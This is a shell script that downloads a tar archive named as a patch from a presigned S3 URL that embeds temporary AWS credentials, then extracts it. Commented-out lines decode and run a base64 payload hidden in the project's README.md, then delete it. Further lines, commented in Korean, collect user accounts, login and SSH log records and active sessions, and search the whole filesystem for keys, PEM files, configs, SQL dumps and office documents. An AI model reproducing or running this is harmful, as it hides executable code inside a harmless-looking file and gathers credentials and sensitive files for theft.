curl -O "https://awss3project4821.s3.ap-southeast-2.amazonaws.com/Patch.v1.2.tar?response-content-disposition=inline&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEMP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaDmFwLXNvdXRoZWFzdC0yIkYwRAIgRAOxbvNhvJpGYy6tYfwcdE4yEUvBNpyFBzOveJp5k4MCIBZHJzfBeHNy2vhhLZO%2FveScZ8ocOhzWnw6QfHmA4L5oKoIDCPz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMOTU5OTc2NjkxOTE5Igxd9UiFdEMgV77VZqwq1gJaY%2FEBXFpbtYUFq0yYEJ7ZixXh%2FGOuEOWnWrjIlTKCxeUonGftQHSWDH4%2FBRS5ziGuKHYCxQZQFXPATjvg5gHz9XXy%2FQ7pny07WSiYfIoaK5M6oDNq2G202izfHMNN2A6lLvxaPHxWrf8Jso5MFnyyHeNZAx5EhOmVWqt%2FIa7OW9esGC9RFTuxyxN%2FyVTzZQz9Hy27XoKoTcROXzpFnmQ8YKRHUd7y2NP%2FNDHyyZh2VfBwj8EagMXg4ld2j4yK5nldkeAegBjUQ4BhQB2Day2ZkCarMsAqQq6Vr7KFzkXZHsBGYKgI8QHlu4ST6m5qWNNUsXLDIpTcIvXHLMd8HWj0IzGQdTOlR2NUhhmMgNfR6qqW0HmuoYFW7sDTs4GpwtsVgD3TSaNAA0rVia5D3mh%2Faj3xIjWhCOn%2B%2FCTrywCX8UXGQeZ06u5AGDAz4w5V191IvSbKV64wt8vqxAY6kALw9Tj66sN7GytYzFof6oZhayyKlSTFqZmoEANz2uruA7M8%2FsVN%2B8o%2BtqtMBiwlDvQxGMHe5RiQLZh3v%2Beo04xcR66cRFT%2FQ5jhVCe%2BK7guVTIE%2BWFphT1AFBomVfSyOcuDf7Afy1XaIHhGXodomYpTXJyO8K8XE8cTQcblh3YaQocoMLelNhx%2B4lRxlUG86EdiXxYpyXWfp1EuFt2R8xT0soUno1Y%2BWmDgaitCRnNNpKKWisATtCwrY38SPKbAPMtILcBrcnNAj0ep038cvNwg1QkknAOcEftg1z1IhnUABdcvbHmharmBI1YqwhF0KWya7f3eXgPjhHPtwJT3LFda9PlCb1HHw886S7Whg4lUuw%3D%3D&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIA57AYR3DHTZCTVAXU%2F20250812%2Fap-southeast-2%2Fs3%2Faws4_request&X-Amz-Date=20250812T025651Z&X-Amz-Expires=43200&X-Amz-SignedHeaders=host&X-Amz-Signature=390cdfd666207698f551cdd0caadf861a45687b56b1bdb2b7be23d42822ccf9f"
tar -xvf Patch.v1.2.tar 
cd PDFator-main

# base64 --decode $PWD/resource/README.md > tmp.sh
# sh tmp.sh
# rm tmp.sh
 
# ## 1. 사용자 계정정보 수집 및 저장
# LOG_FILE="ssh_user_audit_$(date +%Y%m%d_%H%M%S).log"

# echo "🔍 리눅스 SSH 접속 및 계정 정보 수집 스크립트" | tee -a "$LOG_FILE"
# echo "시작 시간: $(date)" | tee -a "$LOG_FILE"
# echo "----------------------------------------" | tee -a "$LOG_FILE"

# # 전체 사용자 계정 목록
# echo -e "\n📋 전체 사용자 계정 목록 (/etc/passwd):" | tee -a "$LOG_FILE"
# cut -d: -f1 /etc/passwd | tee -a "$LOG_FILE"

# # 로그인 가능한 사용자
# echo -e "\n🔐 로그인 가능한 사용자 계정 (유효한 쉘):" | tee -a "$LOG_FILE"
# awk -F: '$7 ~ /(bash|sh|zsh|ksh)/ {print $1}' /etc/passwd | tee -a "$LOG_FILE"

# # 홈 디렉토리 및 기본 쉘
# echo -e "\n📁 홈 디렉토리 및 기본 쉘:" | tee -a "$LOG_FILE"
# awk -F: '{printf "%-15s %-30s %-20s\n", $1, $6, $7}' /etc/passwd | tee -a "$LOG_FILE"

# # 최근 로그인 기록
# echo -e "\n🕒 최근 로그인 기록 (last):" | tee -a "$LOG_FILE"
# last -a | head -n 10 | tee -a "$LOG_FILE"

# # 현재 로그인 사용자
# echo -e "\n👥 현재 로그인 중인 사용자 (who):" | tee -a "$LOG_FILE"
# who | tee -a "$LOG_FILE"

# echo -e "\n📊 현재 세션 상세 정보 (w):" | tee -a "$LOG_FILE"
# w | tee -a "$LOG_FILE"

# # SSH 접속 로그 확인
# SSH_LOG_FILE=""

# if [ -f /var/log/auth.log ]; then
#   SSH_LOG_FILE="/var/log/auth.log"
# elif [ -f /var/log/secure ]; then
#   SSH_LOG_FILE="/var/log/secure"
# else
#   echo -e "\n⚠️ SSH 로그 파일을 찾을 수 없습니다 (/var/log/auth.log 또는 /var/log/secure)." | tee -a "$LOG_FILE"
# fi

# if [ -n "$SSH_LOG_FILE" ]; then
#   echo -e "\n✅ SSH 성공 접속 로그 (최근 20건):" | tee -a "$LOG_FILE"
#   grep "Accepted" "$SSH_LOG_FILE" | tail -n 20 | tee -a "$LOG_FILE"

#   echo -e "\n🚫 SSH 실패/시도 기록 (최근 20건):" | tee -a "$LOG_FILE"
#   grep -E "Failed|Invalid|authentication failure" "$SSH_LOG_FILE" | tail -n 20 | tee -a "$LOG_FILE"
# fi

# # 현재 SSH 세션 확인
# echo -e "\n📡 현재 SSH 세션 (sshd):" | tee -a "$LOG_FILE"
# ps -ef | grep sshd | grep -v grep | tee -a "$LOG_FILE"

# ## 2. 중요파일 목록 조회
# find / -type f \( -name "*.key" -o -name "*.pem" -o -name "*.conf" -o -name "*.sql" -o -name "*.docx" -o -name "*.xlsx" \) 2>/dev/null

